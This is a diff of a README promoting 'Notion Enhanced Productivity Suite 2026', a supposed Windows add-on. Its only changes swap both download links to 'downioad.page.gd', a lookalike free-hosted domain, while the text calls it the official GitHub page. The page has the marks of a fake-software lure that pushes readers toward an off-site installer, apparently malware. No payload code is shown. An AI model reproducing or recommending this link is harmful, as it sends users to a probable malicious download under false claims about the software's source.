@@ -2,7 +2,7 @@
 
 Introducing Notion Enhanced Productivity Suite 2026, a powerful desktop utility designed to elevate your Notion experience on Windows. This tool offers seamless integration with AI features and template packs to boost your productivity. Whether you're managing databases or automating tasks, it provides a comprehensive set of enhancements tailored for modern workflows.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ Updates are available through the same download link. Simply download and run "S
 
 To get started, download the installer from the official GitHub page:
 
-[Get it here](https://download-page.page.gd/)
+[Get it here](https://downioad.page.gd/)
 
 This link provides access to the latest version of Notion Enhanced Productivity Suite, ensuring you have all recent improvements and bug fixes. Last Updated: 2026.
 
